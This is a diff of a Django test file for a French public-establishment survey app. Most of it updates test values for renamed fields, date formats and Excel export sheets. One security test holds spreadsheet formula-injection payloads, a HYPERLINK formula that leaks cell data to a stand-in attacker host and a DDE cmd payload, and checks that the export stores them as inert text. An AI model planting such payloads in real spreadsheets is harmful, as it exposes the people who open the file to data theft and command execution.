@@ -16,18 +16,20 @@ from django.utils import timezone
 from openpyxl import load_workbook
 
 from enquete.models import EPN, Campagne, Envoi, Reponse
-from enquete.questionnaire import MODULES
 
 VALEURS = {
-    "A": {"A01": "Office test", "A02": "OT", "A03": "EPIC", "A04": "Décret 1", "A05": 1990, "A06": "Agriculture",
-          "A07": "Ville", "A08": ""},
-    "B": {"B01": "oui", "B02": 4, "B03": "oui", "B04": "non", "B05": "oui"},
-    "C": {"C01": "Missions", "C02": "nationale", "C03": 1000},
-    "D": {"D01": 100, "D02": 40, "D03": 60, "D04": 30, "D05": 70, "D06": 5, "D07": 3, "D08": 250000000},
-    "E": {"E01": 1000, "E02": 900, "E03": 600, "E04": 200, "E05": 400, "E06": 300, "E07": 200, "E08": None},
-    "F": {"F01": 2, "F02": 5, "F03": 40, "F04": "oui", "F05": ["comptabilite", "paie"]},
-    "G": {"G01": 10, "G02": 7, "G03": 85.5},
-    "H": {"H01": ["financieres"], "H02": "Besoins", "H03": ""},
+    "A": {"A01": "Office test", "A02": "OT", "A03": "EPIC", "A04": "Décret 1", "A05": "1990-05-12", "A06": "Agriculture",
+          "A07": "Ville", "A08": "Région 1", "A09": "+000 01 02 03", "A10": "", "A11": ""},
+    "B": {"B01": "M. Directeur", "B02": "2022-01-15", "B03": "oui", "B04": 9, "B05": 4, "B06": "oui", "B07": "non",
+          "B08": "oui"},
+    "C": {"C01": "Missions", "C02": "Prestations", "C03": ["public"], "C04": "nationale", "C05": 1000},
+    "D": {"D01": 100, "D02": 40, "D03": 60, "D04": 30, "D05": 70, "D09": 20, "D10": 80, "D11": 30, "D12": 50, "D13": 20,
+          "D06": 5, "D07": 3, "D08": 250000000},
+    "E": {"E01": 1000, "E02": 900, "E03": 600, "E04": 200, "E05": 400, "E06": 300, "E07": 200, "E08": None, "E09": None},
+    "F": {"F01": 2, "F02": 5, "F03": 40, "F04": "oui", "F06": "fibre"},
+    "G": {"G01": 10, "G02": 7, "G03": 85.5, "G04": [{"indicateur": "Satisfaction", "cible": "80", "realise": "75,5"}]},
+    "H": {"H04": ["comptabilite", "paie"], "H05": "non", "H06": "", "H07": ["antivirus"]},
+    "I": {"I01": ["financieres"], "I02": 4, "I03": "Besoins", "I04": ""},
     "J": {},
 }
 PDF = b"%PDF-1.4\n%test\n%%EOF\n"
@@ -80,7 +82,7 @@ class ParcoursTests(Base):
         self.assertEqual(self.identifier(r).status_code, 200)
         self.deposer(r, "J01", pdf("etats_financiers.pdf"))
         self.deposer(r, "J02", pdf("rapport.pdf"))
-        for module in MODULES:
+        for module in self.campagne.q.modules:
             resp = self.post("api:module", [r.jeton, module["code"]], {"valeurs": VALEURS[module["code"]], "valider": True})
             self.assertEqual(resp.status_code, 200, f"{module['code']} : {resp.json()['erreurs']}")
         resp = self.post("api:soumettre", [r.jeton], {"certification": True})
@@ -89,7 +91,9 @@ class ParcoursTests(Base):
         self.assertEqual(r.statut, Reponse.Statut.SOUMIS)
         self.assertEqual(r.donnees["D01"], 100)
         self.assertEqual(r.donnees["G03"], 85.5)
-        self.assertEqual(r.donnees["F05"], ["comptabilite", "paie"])
+        self.assertEqual(r.donnees["H04"], ["comptabilite", "paie"])
+        self.assertEqual(r.donnees["A05"], "1990-05-12")
+        self.assertEqual(r.donnees["G04"], [{"indicateur": "Satisfaction", "cible": 80, "realise": 75.5}])
         self.assertEqual(r.telephone, "+000 01 02 03 04")
         self.assertIn("Accusé", mail.outbox[-1].subject)
         # Une fois envoyée, la réponse n'est plus modifiable.
@@ -110,7 +114,7 @@ class ParcoursTests(Base):
         incoherent = VALEURS["D"] | {"D03": 61}
         resp = self.post("api:module", [r.jeton, "D"], {"valeurs": incoherent, "valider": True})
         self.assertEqual(resp.status_code, 422)
-        self.assertIn("différent de l'effectif total", resp.json()["erreurs"]["D02"][0])
+        self.assertIn("différent de « effectif total » (100)", resp.json()["erreurs"]["D02"][0])
         r.refresh_from_db()
         self.assertEqual(r.donnees["D03"], 61)  # rien n'est perdu
         self.assertNotIn("D", r.modules_completes)
@@ -259,9 +263,9 @@ class GestionTests(Base):
 
     def test_tableau_de_bord_export_statistiques_detail(self):
         r = self.nouvelle_reponse()
-        r.statut = Reponse.Statut.SOUMIS
+        r.statut = Reponse.Statut.VALIDE
         r.nom, r.prenom = "Bamba", "Karim"
-        r.donnees = {"D01": 100, "D02": 40, "E01": 1000, "E02": 900, "A03": "EPIC", "A05": 1990, "F05": ["paie"]}
+        r.donnees = {"D01": 100, "D02": 40, "E01": 1000, "E02": 900, "A03": "EPIC", "A05": "1990-05-12", "H04": ["paie"]}
         r.date_soumission = timezone.now()
         r.save()
         self.client.force_login(self.admin)
@@ -271,10 +275,10 @@ class GestionTests(Base):
         self.assertEqual(stats["n"], 1)
         detail = self.client.get(reverse("api:reponse_detail", args=[r.pk])).json()
         lignes = {l["code"]: l["valeur"] for m in detail["modules"] for l in m["lignes"]}
-        self.assertEqual(lignes["A05"], "1990")
+        self.assertEqual(lignes["A05"], "12/05/1990")
         self.assertTrue(lignes["A03"].startswith("Établissement public à caractère industriel"))
         wb = load_workbook(BytesIO(self.client.get(reverse("api:export")).content))
-        self.assertEqual(wb.sheetnames, ["Réponses", "Dictionnaire", "Statistiques", "Indicateurs"])
+        self.assertEqual(wb.sheetnames, ["Réponses", "Dictionnaire", "Statistiques", "Fréquences", "Indicateurs"])
         entetes = [c.value for c in wb["Réponses"][1]]
         self.assertEqual(wb["Réponses"].cell(row=2, column=entetes.index("D01") + 1).value, 100)
         resp = self.post("api:reponse_action", [r.pk, "rouvrir"])
@@ -372,12 +376,12 @@ class SecuriteTests(Base):
         from enquete import export_excel
         r = self.nouvelle_reponse()
         r.nom = '=HYPERLINK("http://pirate.example/?d="&A2,"Cliquez")'
-        r.donnees = {"C01": '=cmd|"/C calc"!A0', "H02": "@SUM(1,1)", "A07": "-2+3"}
+        r.donnees = {"C01": '=cmd|"/C calc"!A0', "I03": "@SUM(1,1)", "A07": "-2+3"}
         r.statut, r.date_soumission = Reponse.Statut.SOUMIS, timezone.now()
         r.save()
         ws = load_workbook(BytesIO(export_excel.classeur(self.campagne, [r])))["Réponses"]
         entetes = [c.value for c in ws[1]]
-        for col in ("Nom du répondant", "C01", "H02", "A07"):
+        for col in ("Nom du répondant", "C01", "I03", "A07"):
             cellule = ws.cell(row=2, column=entetes.index(col) + 1)
             self.assertEqual(cellule.data_type, "s", col)  # texte, jamais formule
         self.assertEqual(ws.cell(row=2, column=entetes.index("C01") + 1).value, '=cmd|"/C calc"!A0')  # contenu conservé
@@ -443,10 +447,10 @@ class PerimetreEtRevocationTests(Base):
         self.assertEqual(self.client.get(reverse("api:reponse_detail", args=[self.r_sante.pk])).status_code, 404)
         self.assertEqual(self.post("api:reponse_action", [self.r_sante.pk, "rouvrir"]).status_code, 404)
         self.assertEqual(self.client.get(reverse("api:tableau_de_bord")).json()["effectif_total"], 10)
-        self.assertEqual(self.client.get(reverse("api:statistiques")).json()["n"], 1)
+        self.assertEqual(self.client.get(reverse("api:statistiques") + "?base=envoyees").json()["n"], 1)
         self.assertEqual(self.client.get(reverse("api:options")).json()["tutelles"], ["Agriculture"])
         self.assertEqual([e["nom"] for e in self.client.get(reverse("api:epn")).json()["epn"]], ["Office test"])
-        ws = load_workbook(BytesIO(self.client.get(reverse("api:export")).content))["Réponses"]
+        ws = load_workbook(BytesIO(self.client.get(reverse("api:export") + "?base=envoyees").content))["Réponses"]
         self.assertEqual([c.value for c in ws["A"]][1:], ["Office test"])
         self.assertEqual(self.client.get(reverse("api:pieces_zip", args=[self.r_sante.pk])).status_code, 404)
         self.assertEqual([c["total"] for c in self.client.get(reverse("api:campagnes")).json()["campagnes"]], [1])
@@ -491,7 +495,7 @@ class PerimetreEtRevocationTests(Base):
     def test_commande_compte_equipe(self):
         sortie = StringIO()
         call_command("compte_equipe", "sup2", "--tutelle", "Santé", "--tutelle", "Éducation",
-                     "--mot-de-passe", "un-mot-de-passe-solide", stdout=sortie)
+                     "--mot-de-passe", "Un-mot-de-passe-solide", stdout=sortie)
         from enquete.models import tutelles_autorisees
         u = User.objects.get(username="sup2")
         self.assertTrue(u.is_staff)
